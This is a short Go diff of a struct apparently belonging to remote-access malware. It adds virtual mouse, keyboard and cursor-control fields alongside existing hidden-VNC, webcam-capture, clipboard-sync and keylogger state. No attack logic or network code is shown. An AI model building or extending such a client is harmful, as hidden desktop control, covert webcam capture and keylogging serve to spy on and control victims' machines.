@@ -35,18 +35,27 @@ type Env struct {
 	HVNCCancel          context.CancelFunc
 	HVNCDone            chan struct{}
 	HVNCMu              sync.Mutex
-	WebcamDeviceIndex   int
-	WebcamFPS           int
-	WebcamUseMaxFPS     bool
-	WebcamQuality       int
-	WebcamCodec         string
-	WebcamCancel        context.CancelFunc
-	WebcamDone          chan struct{}
-	WebcamMu            sync.Mutex
+	// Virtual mode fields
+	VirtualMouseControl    bool
+	VirtualKeyboardControl bool
+	VirtualCursorCapture   bool
+	VirtualCancel          context.CancelFunc
+	VirtualDone            chan struct{}
+	VirtualMu              sync.Mutex
+	// Webcam shit
+	WebcamDeviceIndex int
+	WebcamFPS         int
+	WebcamUseMaxFPS   bool
+	WebcamQuality     int
+	WebcamCodec       string
+	WebcamCancel      context.CancelFunc
+	WebcamDone        chan struct{}
+	WebcamMu          sync.Mutex
+	// Cliboard sync stuff
 	ClipboardSyncCancel context.CancelFunc
 	ClipboardSyncDone   chan struct{}
 	ClipboardSyncMu     sync.Mutex
-	ClipboardSyncSource string // "rd" or "hvnc"
+	ClipboardSyncSource string
 	// Other fields
 	Plugins                   *plugins.Manager
 	Keylogger                 *keylogger.Keylogger
